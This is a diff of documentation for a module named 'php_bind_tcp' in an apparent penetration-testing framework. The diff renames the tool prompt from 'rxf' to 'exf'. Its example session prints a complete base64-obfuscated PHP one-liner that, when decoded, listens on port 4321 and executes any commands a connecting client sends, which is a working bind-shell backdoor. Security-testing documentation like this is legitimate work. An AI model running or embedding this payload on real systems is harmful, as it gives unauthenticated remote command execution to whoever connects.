@@ -4,7 +4,7 @@ Module generates payload that creates interactive tcp bind shell by using php on
 
 ## Verification Steps
 
-  1. Start `./rxf.py`
+  1. Start `./exf.py`
   2. Do: `use payloads/cmd/php_bind_tcp`
   3. Do: `set rport 4321`
   4. Do: `run`
@@ -13,10 +13,10 @@ Module generates payload that creates interactive tcp bind shell by using php on
 ## Scenarios
 
 ```
-rxf > use payloads/cmd/php_bind_tcp
-rxf (PHP Bind TCP One-Liner) > set rport 4321
+exf > use payloads/cmd/php_bind_tcp
+exf (PHP Bind TCP One-Liner) > set rport 4321
 [+] rport => 4321
-rxf (PHP Bind TCP One-Liner) > run
+exf (PHP Bind TCP One-Liner) > run
 [*] Running module...
 [*] Generating payload
 php -r "eval(base64_decode('JHM9c29ja2V0X2NyZWF0ZShBRl9JTkVULFNPQ0tfU1RSRUFNLFNPTF9UQ1ApO3NvY2tldF9iaW5kKCRzLCIwLjAuMC4wIiw0MzIxKTtzb2NrZXRfbGlzdGVuKCRzLDEpOyRjbD1zb2NrZXRfYWNjZXB0KCRzKTt3aGlsZSgxKXtpZighc29ja2V0X3dyaXRlKCRjbCwiJCAiLDIpKWV4aXQ7JGluPXNvY2tldF9yZWFkKCRjbCwxMDApOyRjbWQ9cG9wZW4oIiRpbiIsInIiKTt3aGlsZSghZmVvZigkY21kKSl7JG09ZmdldGMoJGNtZCk7c29ja2V0X3dyaXRlKCRjbCwkbSxzdHJsZW4oJG0pKTt9fQ=='));"
